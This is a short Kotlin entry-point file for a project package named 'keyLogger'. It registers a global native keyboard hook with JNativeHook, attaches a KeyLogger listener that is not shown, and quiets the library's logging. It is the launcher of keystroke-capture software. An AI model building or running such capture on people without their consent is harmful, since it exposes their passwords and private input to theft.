package org.example.project.keyLogger

import org.jnativehook.GlobalScreen
import org.slf4j.LoggerFactory
import java.util.logging.Level
import java.util.logging.Logger

fun main() {
    initialize()

    LoggerFactory.getLogger("KeyLogger.class").info("Key logger has benn started.")

    GlobalScreen.registerNativeHook()
    GlobalScreen.addNativeKeyListener(KeyLogger())
}

fun initialize() {
    val logger = Logger.getLogger(GlobalScreen::class.java.packageName)
    logger.level = Level.WARNING

    logger.useParentHandlers = false
}
